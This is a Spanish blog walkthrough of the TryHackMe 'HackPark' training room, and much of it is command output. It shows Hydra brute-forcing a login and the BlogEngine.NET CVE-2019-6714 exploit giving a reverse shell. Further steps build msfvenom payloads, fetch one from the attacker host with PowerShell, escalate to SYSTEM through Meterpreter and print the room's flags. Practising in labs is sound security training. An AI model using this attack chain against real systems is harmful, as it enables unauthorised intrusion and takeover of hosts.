<!DOCTYPE html>
<html class="" lang="en"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            HackPark [TryHackMe]  &ndash;
        
        K3ssDev
:/var/log$  
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
<meta name="author" content="Alberto Pérez" />

    
        <meta name="keywords" content='Hydra, Medium, Meterpreter, Nishang, Powershell, Privilege Escalation, Reverse Shell, TryHackMe, Windows, WinPEAS' />
    
    
        <meta name="description" content=" un puntito el nivel de dificultad con “HackPark”, la siguiente máquina las series “Offensive Pentesting” de TryHackMe. En esta sala se practican cosas como la fuerza bruta con Hydra contra una app web, el uso de exploits con Metasploit y la elevación de privilegios en Windows." />
    

<meta property="og:site_name"
    content='K3ssDev
:/var/log$  ' />

    <meta property="og:title" content="HackPark [TryHackMe]" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="Alberto Pérez" />
    <meta
        property="article:published_time"
        content='2023-08-30T00:00:00Z&#43;0200' />
    
        
            <meta property="article:tag" content="Hydra" />
        
            <meta property="article:tag" content="Medium" />
        
            <meta property="article:tag" content="Meterpreter" />
        
            <meta property="article:tag" content="Nishang" />
        
            <meta property="article:tag" content="Powershell" />
        
            <meta property="article:tag" content="Privilege Escalation" />
        
            <meta property="article:tag" content="Reverse Shell" />
        
            <meta property="article:tag" content="TryHackMe" />
        
            <meta property="article:tag" content="Windows" />
        
            <meta property="article:tag" content="WinPEAS" />
        
    
    <meta property="og:url" content="https://k3ssdev.github.io/posts/hackpark/" />
    <meta property="og:image"
        content='https://k3ssdev.github.io/images/post_pics/hackpark/hackpark.png
        ' />
    
        <meta property="og:description" content="Introducción Subimos un puntito el nivel de dificultad con “HackPark”, la siguiente máquina las series “Offensive Pentesting” de TryHackMe. En esta sala se prac" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='k3ssdev.github.io'
/>
<meta property="twitter:url" content="https://k3ssdev.github.io/posts/hackpark/" />


    <meta name="twitter:title" content="HackPark [TryHackMe]" />
    
    <meta name="twitter:image"
        content='https://k3ssdev.github.io/images/post_pics/hackpark/hackpark.png
        ' />
    
        <meta name="twitter:description" content="Introducción Subimos un puntito el nivel de dificultad con “HackPark”, la siguiente máquina las series “Offensive Pentesting” de TryHackMe. En esta sala se prac" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">K3ssDev
:/var/log$  </a>
                        
                    </h1>
                    
                        <label id="hamburger-menu" for="main-nav-toggler">
                            &#xf85b;
                        </label>
                    
                </div>
                <div id="wide_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="mailto:k3ssdev@proton.me">
    
    
        &#xf6ed;
    
    <span>
        Email
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
    
    
        &#xf0e1;
    
    <span>
        Linkedin
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/k3ssdev">
    
    
        &#xf09b;
    
    <span>
        Github
    </span>
</a>

    </div>
    
        <div id="sidebar_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
        
    
<script src="https://tryhackme.com/badge/1277295"></script>


</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>HackPark [TryHackMe]</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-08-30

</p>
    
    
    
        <figure style="margin: 0">
            <img src="/images/post_pics/hackpark/hackpark.png" alt="" />
            
        </figure>
    
    
    <div><h2 id="introducción">Introducción</h2>
<p>Subimos un puntito el nivel de dificultad con “HackPark”, la siguiente máquina las series “Offensive Pentesting” de TryHackMe. En esta sala se practican cosas como la fuerza bruta con Hydra contra una app web, el uso de exploits con Metasploit y la elevación de privilegios en Windows.</p>
<h2 id="task-1---desplegar-la-máquina">Task 1 - Desplegar la máquina</h2>
<h3 id="paso-1">Paso 1:</h3>
<ul>
<li>Pongo la máquina en marcha y accedo a la aplicación web que tiene.</li>
<li>La primera pregunta es sobre la imagen que sale en la web, un famoso payaso de una película de miedo.</li>
</ul>
<h2 id="task-2---using-hydra-to-brute-force-a-login">Task 2 - Using Hydra to brute-force a login</h2>
<h3 id="paso-2">Paso 2:</h3>
<ul>
<li>Compruebo que hay formulario de login en la web.</li>
<li>Asumo que hay usuario “admin”.</li>
<li>Uso burp suite para obtener POST del formulario.</li>
<li>Uso la información recogida en burp para construir un ataque de fuerza bruta con hydra.</li>
<li>El login es admin / 1qaz2wsx</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Uso de Hydra, el modulo http-post-form lleva 3 arugmentos [ url : request_body : mensaje_error] </span>
</span></span><span style="display:flex;"><span>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.208.69 http-post-form <span style="color:#e6db74">&#39;/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=y6wRZsJzImyMo53LFSrnXLB7%2B7fzAbEyOX49Iqu3R14GnH%2FF8xhUZyKuJbrpjBk7rG8CXgjXJiod6JKbG86G17C0pLg%2FQIfxvi3j%2Br5M4vUm2iGKcDzMw1rNlAgtyccYdUjRO7E4XqX2E458%2FRv94OhBikBC7HSHYfwHwPgk4heOWJRE&amp;__EVENTVALIDATION=ZIbXaJYNTD%2Bk8WtwTcECTcM8T7R2qKZIT%2B%2BO9VZFWT5GsVoRUjEINZfLga4xe6YJp3wHe5LKoD%2BhLEVcq0SbNLZmz1uVZ1ORX3IOX66bzAxqhXQpJsxQnUAbluEBTgxH%2B8FYtXrCMPaFlar3UZLOQtc%2FclRU2NolNTC2I%2FmjAbyhqQHR&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Iniciar+sesi%C3%B3n:Login Failed&#39;</span> -vv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> Resolving addresses ... <span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> resolving <span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> Page redirected to http<span style="color:#f92672">[</span>s<span style="color:#f92672">]</span>://10.10.208.69:80/admin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.208.69   login: admin   password: 1qaz2wsx
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> attack finished <span style="color:#66d9ef">for</span> 10.10.208.69 <span style="color:#f92672">(</span>waiting <span style="color:#66d9ef">for</span> children to complete tests<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="task-3---compromise-the-machine">Task 3 - Compromise the machine</h2>
<h3 id="paso-3">Paso 3:</h3>
<ul>
<li>WebApp es BlogEngine versión 3.3.6.0</li>
<li>Encuentro exploit CVE-2019-6714 <a href="https://www.exploit-db.com/exploits/46353">BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution</a></li>
</ul>
<h3 id="paso-4">Paso 4:</h3>
<ul>
<li>Descargo exploit, cambio IP y puerto.</li>
<li>Renombro fichero a <code>PostView.ascx</code></li>
<li>Subo fichero al server en <code>http://10.10.10.10/admin/app/editor/editpost.cshtml</code></li>
<li>Activo exploit al abrir <code>http://10.10.10.10/?theme=../../App_Data/files</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Shell inversa con éxito</span>
</span></span><span style="display:flex;"><span>rlwrap nc -lvnp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.14.50.184<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.208.69<span style="color:#f92672">]</span> <span style="color:#ae81ff">49268</span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;whoami
</span></span><span style="display:flex;"><span>iis apppool<span style="color:#ae81ff">\b</span>log
</span></span></code></pre></div><h1 id="task-4---windows-privilege-escalation">Task 4 - Windows Privilege Escalation</h1>
<h3 id="paso-5">Paso 5:</h3>
<ul>
<li>Creo un payload con msfvenom para obtener sesión con meterpreter.</li>
<li>Utilizo el script x86/shikata_ga_nai</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Comando de msfvenom para crear el payload</span>
</span></span><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.14.50.184 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> -f exe -o shell-name.exe     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">73802</span> bytes
</span></span><span style="display:flex;"><span>Saved as: shell-name.exe
</span></span></code></pre></div><h3 id="paso-6">Paso 6:</h3>
<ul>
<li>Preparo metasploit con exploit/multi/handler</li>
<li>Inicio servidor web con python para descargarlo en el objetivo.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Mestasploit</span>
</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LHOST tun0
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">1234</span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Servidor web con python</span>
</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>                                                                                                                         
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># netcat, comando en shell remota</span>
</span></span><span style="display:flex;"><span>powershell -c <span style="color:#e6db74">&#34;Invoke-WebRequest -Uri &#39;http://10.14.50.184/shell-name.exe&#39; -OutFile &#39;C:\Windows\temp\shell.exe&#39;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># el comnado run se ejecuta antes que .\shell.exe</span>
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ejecuto shell en maquina remota</span>
</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\s</span>hell.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.14.50.184:1234 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 10.10.208.69
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>10.14.50.184:1234 -&gt; 10.10.208.69:49314<span style="color:#f92672">)</span> at 2023-08-29 22:04:06 +0200
</span></span></code></pre></div><ul>
<li>Meterpreter</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Recopilo informacion del sistema</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo 
</span></span><span style="display:flex;"><span>Computer        : HACKPARK
</span></span><span style="display:flex;"><span>OS              : Windows <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>6.3 Build 9600<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Architecture    : x64
</span></span><span style="display:flex;"><span>System Language : en_US
</span></span><span style="display:flex;"><span>Domain          : WORKGROUP
</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Meterpreter     : x86/windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Informacion de usuario sesión</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
</span></span></code></pre></div><ul>
<li>Encuentro servicio WScheduler corriendo en el sistema, reviso sus logs.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: c:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\S</span>ystemScheduler<span style="color:#ae81ff">\E</span>vents
</span></span><span style="display:flex;"><span><span style="color:#f92672">======================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size   Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----   ----  -------------              ----
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">1959</span>   fil   2023-08-29 22:18:34 +0200  20198415519.INI
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">30551</span>  fil   2023-08-29 22:18:34 +0200  20198415519.INI_LOG.txt
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">290</span>    fil   2020-10-02 23:50:12 +0200  2020102145012.INI
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">186</span>    fil   2023-08-29 22:16:31 +0200  Administrator.flg
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">182</span>    fil   2023-08-29 22:16:28 +0200  SYSTEM_svc.flg
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">0</span>      fil   2023-08-29 20:44:12 +0200  Scheduler.flg
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">449</span>    fil   2023-08-29 22:16:31 +0200  SessionInfo.flg
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">0</span>      fil   2023-08-29 22:17:39 +0200  service.flg
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cat 20198415519.INI_LOG.txt
</span></span><span style="display:flex;"><span>08/04/19 15:06:01,Event Started Ok, <span style="color:#f92672">(</span>Administrator<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe <span style="color:#f92672">(</span>Administrator<span style="color:#f92672">)</span>
</span></span></code></pre></div><ul>
<li>Migro el proceso al de Message.exe o ejecuto en meterpreter “getsystem”</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Flag de usuario jeff</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>eff<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span><span style="color:#f92672">==============================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2019-08-04 20:54:53 +0200  desktop.ini
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2019-08-04 20:57:10 +0200  user.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cat user.txt 
</span></span><span style="display:flex;"><span>759bd8af507517bcfaede78a21a73e39
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># flag de root</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
</span></span><span style="display:flex;"><span><span style="color:#f92672">=======================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">1029</span>  fil   2019-08-04 13:36:42 +0200  System Scheduler.lnk
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">282</span>   fil   2019-08-03 19:43:54 +0200  desktop.ini
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#ae81ff">32</span>    fil   2019-08-04 20:51:42 +0200  root.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cat root.txt 
</span></span><span style="display:flex;"><span>7e13d97f05f7ceb9881a3eb3d78d3e72
</span></span></code></pre></div><h2 id="task-4---privilege-escalation-without-metasploit">Task 4 - Privilege Escalation Without Metasploit</h2>
<ul>
<li>Se puede conseguir acceso privilegiado sin metasploit.</li>
<li>Se crea paylod con msfvenom de windows/shell_reverse_tcp</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Genero el payload nuevo</span>
</span></span><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp  -a x86 --encoder x86/shikata_ga_nai LHOST<span style="color:#f92672">=</span>10.14.50.184 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> -f exe -o shell_tcp.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Preparo servidor python y lo descargo en la maquina remota</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># El listener recibe la conexion</span>
</span></span><span style="display:flex;"><span>rlwrap nc -lvnp <span style="color:#ae81ff">1234</span>                                                                                                                    
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1234</span> ...
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.14.50.184<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.208.69<span style="color:#f92672">]</span> <span style="color:#ae81ff">49397</span>
</span></span><span style="display:flex;"><span>dir
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.3.9600<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2013</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp&gt;
</span></span></code></pre></div><ul>
<li>Ejecucion de WinPEAS y busqueda de fecha de instalación original:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Subo WinPEAS.bat y lo ejecuto. Es un proceso largo y algo aburrido, asi que obtengo la fecha con systeminfo</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt;systeminfo | findstr /i date
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Original Install Date:     8/3/2019, 10:43:23 AM
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Aunque se supone que ésta máquina es mas compleja que las anteriores, me he sentido cómodo usando Burp Suite, Hydra, Msfvenom y Metasploit. La mayor parte de los problemas en esta sala me los he encontrado con las shells inversas, que no acaban de ser muy estables por lo que sea, excepto con meterpreter que si que ha ido bien. Tampoco me ha parecido muy fluido el uso de WinPEAS, aunque es una herramienta interesante.</p>
<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
</div>
</article>

    
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                class="buttonTag"
                
                href="/tags/hydra">#Hydra</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/medium">#Medium</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/meterpreter">#Meterpreter</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/nishang">#Nishang</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/powershell">#Powershell</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/privilege-escalation">#Privilege Escalation</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/reverse-shell">#Reverse Shell</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/tryhackme">#TryHackMe</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/windows">#Windows</a>
        
            <a
                
                class="buttonTag"
                
                href="/tags/winpeas">#WinPEAS</a>
        
    </p>






                    </main><footer>
    <hr />


<p><small>
        2024 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
